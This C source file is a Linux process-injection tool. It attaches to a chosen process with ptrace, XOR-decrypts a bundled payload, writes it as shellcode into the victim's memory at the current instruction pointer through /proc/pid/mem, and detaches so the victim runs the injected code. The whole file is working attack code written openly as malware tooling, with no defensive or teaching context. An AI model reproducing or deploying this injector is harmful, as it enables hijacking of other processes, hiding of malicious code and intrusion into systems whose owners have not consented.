#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <fcntl.h>

#include "encrypted_payload.h"

static unsigned char *decrypt_payload(void)
{
	unsigned char *buf; 
	unsigned int i; 

	buf = malloc(encrypted_payload_len);
	if (buf == NULL) {
		perror("malloc");
		return NULL; 
	}

	for (i = 0; i < encrypted_payload_len; i++) {
		buf[i] = encrypted_payload[i] ^ 0xAA; 
	}

	return buf; 
}

int main(int argc, char *argv[])
{
	pid_t target; 
	struct user_regs_struct regs;
	unsigned char *payload; 
	char mem_path[64];
	int mem_fd; 
	int status; 

	if (argc != 2) {
		fprintf(stderr, "usage: %s <pid>\n", argv[0]);
		return 1; 
	}

	target = (pid_t)atoi(argv[1]);
	printf("[*] targeting pid %d\n", target);

	/* step 1: attach to the victim process */
	/* send sigstop */
	if (ptrace(PTRACE_ATTACH, target, NULL, NULL) == -1) {
		perror("ptrace attach");
		return 1; 
	}

	/* wait for victim to actually stoep */
	waitpid(target, &status, 0);
	printf("[*] victim stopped\n");

	/* step 2: read victim registers */
	if (ptrace(PTRACE_GETREGS, target, NULL, &regs) == -1) {
		perror("ptrace getregs");
		ptrace(PTRACE_DETACH, target, NULL, NULL); 
		return 1; 
	}

	printf("[*] victim rip: 0x%llx\n", regs.rip);

	/* prepare the payload*/
	payload = decrypt_payload(); 
	if (payload == NULL) {
		ptrace(PTRACE_DETACH, target, NULL, NULL);
		return 1; 
	}

	/* open /proc/pid/mem for writing */
	snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", target);
	mem_fd = open(mem_path, O_RDWR);
	if (mem_fd == -1) {
		perror("open /proc/pid/mem");
		free(payload);
		ptrace(PTRACE_DETACH, target, NULL, NULL);
		return 1; 
	}

	/* write shellcode into victims memory at current rip */
	/* use lseek to find where rip is (wirte) */
	if (lseek(mem_fd, (off_t)regs.rip, SEEK_SET) == - 1) {
		perror("lseek");
		free(payload);
		close(mem_fd);
		ptrace(PTRACE_DETACH, target, NULL, NULL);
		return 1; 
	}

	if (write(mem_fd, payload, encrypted_payload_len) == -1) {
		perror("write to /proc/pid/mem");
		free(payload);
		close(mem_fd);
		ptrace(PTRACE_DETACH, target, NULL, NULL);
		return 1; 
	}

	printf("[*] shellcode written to victim memory at 0x%llx", regs.rip);

	free(payload);
	close(mem_fd);

	/* detach and let victim continue running */
	if (ptrace(PTRACE_DETACH, target, NULL, NULL) == - 1) {
		perror("ptrace detach");
		return 	1; 
	} 

	printf("[*] detached, victim now executing shellcode");

	return 0; 
}